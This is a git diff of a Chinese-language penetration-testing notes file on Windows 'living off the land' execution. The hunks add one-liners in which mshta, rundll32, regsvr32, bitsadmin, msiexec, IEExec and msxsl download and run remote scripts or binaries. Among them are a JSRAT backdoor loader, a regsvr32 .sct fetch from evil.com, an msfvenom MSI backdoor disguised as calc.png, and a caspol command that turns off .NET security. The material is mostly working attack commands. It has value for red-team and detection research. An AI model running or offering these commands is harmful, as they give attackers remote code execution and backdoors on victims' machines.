@@ -32,7 +32,6 @@ JScript参考链接：http://www.yuanma.net/Manual/JavaScript/
 
 https://evi1cg.me/archives/Run_JSRAT.html
 
-https://github.com/Ridter/MyJSRat
 
 通过访问wtf来获取payload, 最后是通过rundll32来执行的payload，不需要使用powershell
 
@@ -43,16 +42,20 @@ HTA（HTML Application)，可以嵌入`JScript`和`VBScript`，后缀名为`.hta
 	mshta vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct"").Exec()"))
 
 	mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();close();
+	
+	mshta http://site.com/run.hta
 
 #### 6. Rundll32 ####
 
-利用时需要注意`RunHTMLApplication`后面是有一个空格。
+server端执行https://github.com/Ridter/MyJSRat .利用时需要注意`RunHTMLApplication`后面是有一个空格。
 
 	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%  #JSRAT
 
 	rundll32 AllTheThings.dll,EntryPoint 
 
 	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct");o.Exec();window.close();	
+	
+	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://urlto/jsbackdoor.wsc")
 
 通过`system`的一些`dll`可以扩展很多绕过方法：
 
@@ -134,6 +137,8 @@ http://www.codesec.net/view/443056.html
 远程脚本加载运行
 
 	regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+	
+	regsvr32 /s /n /u /i:http://urlto/JSRAT.sct scrobj.dll
 
 	regsvr32.exe  payload.dll	# DLLregisterServer
 	regsvr32.exe  /u payload.dll # DLLUnregisterServer
@@ -154,6 +159,19 @@ windows 文件下载
 	cmd.exe /c bitsadmin /transfer d90f http://vps/a %APPDATA%d90f.exe&%APPDATA%d90f.exe&del %APPDATA%d90f.exe
 
 http://vps/a 为通过msfvenom生成payload
+
+
+#### 11.msiexec/IEEXEC/msxsl
+
+	msiexec /q /i http://site.com/payloads/calc.png
+	
+	C:\Windows\Microsoft.NET\Framework\v2.0.50727> caspol -s off
+
+	C:\Windows\Microsoft.NET\Framework\v2.0.50727> IEExec http://192.168.3.1/test.exe
+	
+	msxsl https://website.com/scripts/demo.xml https://website.com/scripts/exec.xsl
+	
+其中calc.png为通过msfvenom生成的msi后门程序,test.exe为msfvenom生成的exe后门
 
 
 #### MISC
